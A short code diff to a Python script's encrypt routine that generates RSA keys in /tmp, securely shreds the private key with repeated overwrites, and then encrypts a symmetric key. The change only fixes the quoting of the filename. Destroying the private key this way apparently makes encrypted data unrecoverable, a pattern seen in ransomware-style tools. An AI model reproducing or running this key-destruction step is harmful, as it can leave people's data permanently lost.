@@ -20,7 +20,7 @@ def encrypt():
 		print(Color.WHITE + '[*] RSA Keys Created Successfully In /tmp Directory')
 		print(Color.WHITE + '[*] Shredding Private Key ...')
 		os.chdir('/tmp')
-		sp.call(['shred', '-zvun', '25', privatekey.key])
+		sp.call(['shred', '-zvun', '25', 'privatekey.key'])
 		print(Color.WHITE + '[*] Key Deleted Successfully')
 		# Encrypt symmetric key
 		encrypt_symmetric_key()
